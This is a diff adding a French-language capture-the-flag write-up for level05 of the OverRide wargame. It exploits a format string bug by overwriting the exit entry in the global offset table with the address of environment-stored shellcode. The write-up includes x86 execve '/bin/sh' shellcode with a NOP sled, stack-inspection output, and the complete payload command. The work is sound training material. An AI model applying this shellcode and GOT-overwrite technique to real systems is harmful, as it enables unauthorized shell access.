@@ -1,0 +1,42 @@
+Pour exploité ce binaire le principe etait d'utilisé l'exploit de type 'format string'
+et de reecrire l'adresse de la fonction exit qui se trouve dans la global offset table par l'adresse de notre shellcode exporté dans notre environement
+
+$(python -c 'print "export SHELLCODE=" + "\x90"*100 + "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80"')
+
+
+level05@OverRide:~$ ./level05
+%x %x %x %x %x %x %x %x %x %x %x %x
+64 f7fcfac0 f7ec3af9 ffffd65f ffffd65e 0 ffffffff ffffd6e4 f7fdb000 25207825 78252078 20782520
+
+Nous constatons que nous pouvons reecrire l adresse a partir du 10e arguments
+
+objdump -R level05
+
+level05:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+080497c4 R_386_GLOB_DAT    __gmon_start__
+080497f0 R_386_COPY        stdin
+080497d4 R_386_JUMP_SLOT   printf
+080497d8 R_386_JUMP_SLOT   fgets
+080497dc R_386_JUMP_SLOT   __gmon_start__
+080497e0 R_386_JUMP_SLOT   exit
+080497e4 R_386_JUMP_SLOT   __libc_start_main
+
+L'adresse qui nous interesse est celle d'exit soit 080497e0 que nous allons reecrire en deux temps
+
+080497e0 - 08049xe2
+
+si nous affichons les 30 premier registre de esp en mettant un breakpoint sur l instruction 0x0804850c nous voyons en premier l'adresse qui contient notre input et que cette adresse ce trouve a 11 word de la stack et que par consequent nous allons reecrire 
+
+(gdb) x/30xw $esp
+0xffffd5e0:	0xffffd608	0x00000064	0xf7fcfac0	0xf7ec3af9
+0xffffd5f0:	0xffffd62f	0xffffd62e	0x00000000	0xffffffff
+0xffffd600:	0xffffd6b4	0x00000000	0x080497e0	0x080497e2
+0xffffd610:	0x34353525	0x25783030	0x6e243031	0x31303125
+0xffffd620:	0x25783732	0x6e243131	0xffff000a	0xf7fceff4
+0xffffd630:	0x08048520	0x080497c8	0x00000001	0x08048321
+0xffffd640:	0xf7fcf3e4	0x0000000d	0x080497c8	0x08048541
+
+(python -c 'print "\x08\x04\x97\xe2\x08\x04\x97\xe0"[::-1] + "%55400x%10$n%10127x%11$n"'; cat) | ./level05
